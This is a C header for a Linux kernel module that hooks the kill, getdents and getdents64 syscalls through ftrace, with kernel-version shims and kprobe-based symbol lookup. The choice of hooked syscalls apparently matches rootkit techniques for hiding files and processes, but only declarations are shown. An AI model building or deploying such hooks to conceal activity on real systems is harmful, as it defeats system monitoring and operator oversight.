#ifndef HTM_HOOK_H
#define HTM_HOOK_H

#include <linux/ftrace.h>
#include <linux/version.h>

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
#define HTM_SYM_KILL       "__x64_sys_kill"
#define HTM_SYM_GETDENTS   "__x64_sys_getdents"
#define HTM_SYM_GETDENTS64 "__x64_sys_getdents64"
#else
#define HTM_SYM_KILL       "sys_kill"
#define HTM_SYM_GETDENTS   "sys_getdents"
#define HTM_SYM_GETDENTS64 "sys_getdents64"
#endif

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0))
#define HTM_PTREGS_SYSCALL_STUBS 1
#endif

// When `HTM_USE_FENTRY_OFFSET` is 1, some kernel versions may crash (6.12 and others)
#define HTM_USE_FENTRY_OFFSET 0 

#if ! HTM_USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 11, 0)
#define ftrace_regs pt_regs
#define ftrace_get_regs(fregs) ((struct pt_regs *)fregs)
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define HTM_KPROBE_LOOKUP 1
#else
#define HTM_KPROBE_LOOKUP 0
#endif

#ifndef FTRACE_OPS_FL_RECURSION
#define FTRACE_OPS_FL_RECURSION 0
#endif

#define HTM_HOOK(_name, _hook, _orig) \
{                                     \
	.enabled = 0,                 \
	.name = (_name),              \
	.function = (_hook),          \
	.original = (_orig),          \
}

struct htm_ftrace_hook {
	bool enabled;
	const char *name;
	void *function;
	void *original;
	unsigned long address;
	struct ftrace_ops ops;
};

unsigned long htm_resolve_sym(const char *symname);

int htm_hook_install(struct htm_ftrace_hook *hook);
int htm_hook_uninstall(struct htm_ftrace_hook *hook);
int htm_hook_install_list(struct htm_ftrace_hook *hooks, size_t count);
int htm_hook_uninstall_list(struct htm_ftrace_hook *hooks, size_t count);
#endif
